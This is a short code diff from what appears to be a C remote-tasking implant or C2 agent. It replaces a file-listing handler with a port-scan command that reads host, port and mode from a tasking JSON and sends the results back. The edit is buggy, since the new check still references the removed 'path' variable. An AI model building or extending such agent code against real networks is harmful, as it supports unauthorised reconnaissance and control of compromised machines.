@@ -421,11 +421,19 @@ void handleTask(TaskBundle *bundle) {
             // TODO: Implement port scan
             }  else if (strcmp(command->valuestring, "pscan") == 0) {
                 if (param_json != NULL) {
-                    cJSON *path = cJSON_GetObjectItem(param_json, "path");
-                    if (cJSON_IsString(path) && (path->valuestring != NULL)) {
+                    cJSON *host = cJSON_GetObjectItem(param_json, "host");
+                    cJSON *mode = cJSON_GetObjectItem(param_json, "mode");
+                    cJSON *port = cJSON_GetObjectItem(param_json, "port");
+
+
+
+//check parameters are what we think they are 
+                if (cJSON_IsString(host) && (path->valuestring != NULL)) {
                         TaskResponse task_response = {0};
                         task_response.task_uuid = task_uuid->valuestring;
-                        fileListing(path->valuestring, &task_response);
+
+                        //(char *host, char *port, char *mode, char *task_uuid, TaskResponse *resp)
+                        portScan(host->valuestring,port->valuestring,mode->valuestring, &task_response);
                         sendResponse(bundle->agent, &task_response);
                     }
                 }
